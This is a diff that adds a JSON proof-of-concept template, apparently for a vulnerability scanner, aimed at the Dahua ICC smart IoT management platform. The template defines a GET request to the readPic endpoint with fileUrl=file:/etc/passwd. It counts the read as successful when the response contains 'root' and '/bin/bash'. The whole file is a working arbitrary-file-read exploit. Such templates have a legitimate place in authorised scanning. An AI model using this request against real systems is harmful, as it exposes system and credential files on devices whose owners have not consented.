@@ -1,0 +1,19 @@
+{
+  "poc": "大华ICC智能物联综合管理平台 readPic 任意文件读取",
+  "req":[
+    {
+      "method": "GET",
+      "uri": "/evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd",
+      "headers":{
+        "user-agent": "5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
+        "content-type": "application/json"
+      },
+      "data": "",
+      "check":{
+        "status": 200,
+        "header_words": [],
+        "body_words": ["root","/bin/bash"]
+      }
+    }
+  ]
+}
